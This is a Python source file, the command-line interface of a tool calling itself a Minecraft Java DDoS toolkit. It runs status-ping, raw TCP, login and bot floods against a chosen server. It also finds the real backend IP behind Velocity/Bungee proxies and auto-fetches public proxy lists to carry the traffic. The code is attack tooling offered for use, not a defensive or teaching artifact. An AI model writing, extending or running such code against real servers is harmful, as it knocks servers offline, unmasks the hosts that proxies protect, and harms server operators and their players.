"""Command-line interface for MCDDOS.

Commands:
  status   - quick ping, show version/motd/players
  realip   - find real IP behind Velocity/Bungee
  proxies  - fetch + verify proxy pool
  ping     - status ping flood
  tcp      - raw TCP connect flood
  login    - full login flood
  bot      - bot load (join + keepalive + chat)
  mixed    - everything at once
"""
import argparse
import asyncio
import json
import signal
import sys
import time

from .versions import protocol_of, VERSIONS
from .mcconn import MCConn, MCConnError
from . import realip as realip_mod
from . import proxies as proxies_mod
from . import ddos
from . import bots as bots_mod


def _parse_args():
    p = argparse.ArgumentParser(
        prog="mcddos",
        description="Minecraft Java DDoS toolkit 1.16 -> 26.3 "
                    "(bypass Velocity/Bungee, real-IP discovery, auto proxies, bots)")
    p.add_argument("command", choices=["status", "realip", "proxies", "ping", "tcp",
                                       "login", "bot", "mixed", "versions"],
                   help="what to do")
    p.add_argument("host", nargs="?", help="server host (ip or domain)")
    p.add_argument("port", nargs="?", type=int, default=25565)
    p.add_argument("-v", "--version", default=None,
                   help="client version to use (1.16, 1.20.4, 26.3 ...) or protocol number")
    p.add_argument("-w", "--workers", type=int, default=20, help="concurrent workers")
    p.add_argument("-n", "--bott", type=int, default=20, help="number of bots")
    p.add_argument("-t", "--time", type=int, default=0, help="run duration seconds (0=forever)")
    p.add_argument("--proxy", action="append", default=[],
                   help="proxy url (http://ip:port, socks5://...) may repeat; 'file' path to list")
    p.add_argument("--fetch-proxies", action="store_true",
                   help="auto-fetch public proxy lists and verify them")
    p.add_argument("--online", action="store_true", help="online (Mojang) mode (needs auth, rarely)")
    p.add_argument("--no-scan", action="store_true", help="realip: skip subnet scan")
    p.add_argument("--chat-every", type=float, default=8.0, help="seconds between bot chats")
    p.add_argument("--quiet", action="store_true")
    p.add_argument("--json", action="store_true", help="json output (status/realip)")
    return p.parse_args()


def _load_proxies(specs):
    out = []
    for s in specs:
        try:
            import os
            if os.path.exists(s):
                text = open(s).read()
                for line in text.splitlines():
                    pr = proxies_mod.parse_proxy_line(line)
                    if pr:
                        out.append(pr)
            else:
                pr = proxies_mod.parse_proxy_line(s)
                if pr:
                    out.append(pr)
        except Exception:
            pass
    return out


def _pick_version(args, server_version=None):
    if args.version:
        return args.version
    if server_version:
        # server status version looks like "1.20.4 (765)" or "1.20.4"
        try:
            name = server_version.split("(")[0].strip()
            protocol_of(name)
            return name
        except Exception:
            pass
    return "1.21.1"


async def _cmd_status(args):
    c = MCConn(args.host, args.port)
    info = await c.status()
    if args.json:
        print(json.dumps(info or {}, indent=1))
    else:
        if not info:
            print("server did not respond")
            return 1
        ver = info.get("version", {})
        desc = info.get("description", "")
        if isinstance(desc, dict):
            desc = desc.get("text", str(desc))
        players = info.get("players", {})
        print(f"host      : {args.host}:{args.port}")
        print(f"version   : {ver.get('name')} ({ver.get('protocol')})")
        print(f"motd      : {desc}")
        print(f"players   : {players.get('online')}/{players.get('max')}")
        n = players.get("sample", [])
        for pl in n[:10]:
            print(f"   - {pl.get('name')}")
    await c.close()
    return 0


async def _cmd_realip(args):
    version = _pick_version(args, None)
    pvn = protocol_of(version) if not args.version or not args.version.isdigit() else int(args.version)

    def log(msg):
        if not args.quiet:
            print(msg)

    found = await realip_mod.find_real_ip_async(
        args.host, args.port, protocol=pvn,
        scan_subnet=not args.no_scan, log=log)
    if args.json:
        print(json.dumps(found, indent=1))
    else:
        for f in found:
            print(f"{f['ip']}:{f['port']}  via {f['via']}")
        if not found:
            print("no backend found")
    return 0


async def _cmd_proxies(args):
    proxies = _load_proxies(args.proxy)
    if args.fetch_proxies:
        log = lambda m: None if args.quiet else print(m)
        log("fetching public proxy lists...")
        fetched = await proxies_mod.fetch_proxies(limit=2000)
        log(f"parsed {len(fetched)} proxies")
        proxies.extend(fetched)
    if not proxies:
        print("no proxies (use --proxy / --fetch-proxies)")
        return 1
    version = _pick_version(args, None)
    pvn = protocol_of(version)
    log = lambda m: None if args.quiet else print(m)
    log(f"verifying {len(proxies)} proxies against {args.host}:{args.port} ...")
    good, bad = await proxies_mod.verify_proxies(
        proxies[:800], args.host, args.port, pvn,
        max_workers=30, timeout=8.0,
        on_progress=lambda done, ok, bad: log(f"  {done} done, {ok} good"))
    log(f"GOOD PROXIES: {len(good)}")
    for p in good[:30]:
        print(proxies_mod.to_url(p))
    return 0


async def _run_flood(args, mode):
    version = _pick_version(args, None)
    proxies = _load_proxies(args.proxy)
    if args.fetch_proxies:
        fetched = await proxies_mod.fetch_proxies(limit=1500)
        proxies.extend(fetched)
    pvn = protocol_of(version)

    stop = {"flag": False}
    def _stop(signum, frame):
        stop["flag"] = True

    signal.signal(signal.SIGINT, _stop)
    if args.time:
        async def timed_stop():
            await asyncio.sleep(args.time)
            stop["flag"] = True
        asyncio.create_task(timed_stop())

    stats = ddos.Stats()
    log = lambda m: None if args.quiet else print(m)
    log(f"mode={mode} host={args.host}:{args.port} version={version} workers={args.workers}")
    t0 = time.time()
    last = [t0]

    async def reporter():
        while not stop["flag"]:
            await asyncio.sleep(2.0)
            now = time.time()
            dt = now - last[0]
            r = stats.ok / dt if dt > 0 else 0
            last[0] = now
            if not args.quiet:
                print(f"  ok={stats.ok} fail={stats.fail} rate={r:.0f}/s "
                      f"up={int(now - t0)}s")

    pool = None
    rep = asyncio.create_task(reporter())
    try:
        if mode == "ping":
            await ddos.ping_ddos(args.host, args.port, version, workers=args.workers,
                                 stop=lambda: stop["flag"], stats=stats, log=log)
        elif mode == "tcp":
            await ddos.tcp_ddos(args.host, args.port, workers=args.workers,
                                stop=lambda: stop["flag"], stats=stats, log=log)
        elif mode == "login":
            await ddos.login_ddos(args.host, args.port, version, workers=args.workers,
                                  stop=lambda: stop["flag"], stats=stats, log=log)
        elif mode == "mixed":
            pool = await ddos.mixed_ddos(args.host, args.port, version,
                                         workers=args.workers, bot_count=args.bott,
                                         stop=lambda: stop["flag"], stats=stats, log=log)
        elif mode == "bot":
            pool = ddos.bot_load(args.host, args.port, version, count=args.bott,
                                 proxy=proxies[0] if proxies else None,
                                 online=args.online, chat_every=args.chat_every, log=log)
            while not stop["flag"]:
                await asyncio.sleep(1.0)
                s = pool.stats()
                if not args.quiet:
                    print(f"  bots={s['total']} joined={s['joined']} kicks={s['kicks']} chats={s['chats']}")
    finally:
        rep.cancel()
        if pool:
            await pool.stop_all()
    log(f"done: ok={stats.ok} fail={stats.fail} in {int(time.time() - t0)}s")
    return 0


async def main(argv=None):
    args = _parse_args()
    if args.command == "versions":
        for k, v in sorted(VERSIONS.items(), key=lambda kv: kv[1]):
            print(f"{k:8} {v}")
        return 0
    if not args.host:
        print("need host for command " + args.command)
        return 2
    if args.command == "status":
        return await _cmd_status(args)
    if args.command == "realip":
        return await _cmd_realip(args)
    if args.command == "proxies":
        return await _cmd_proxies(args)
    return await _run_flood(args, args.command)


def main_sync(argv=None):
    return asyncio.run(main(argv))


if __name__ == "__main__":
    sys.exit(main_sync())
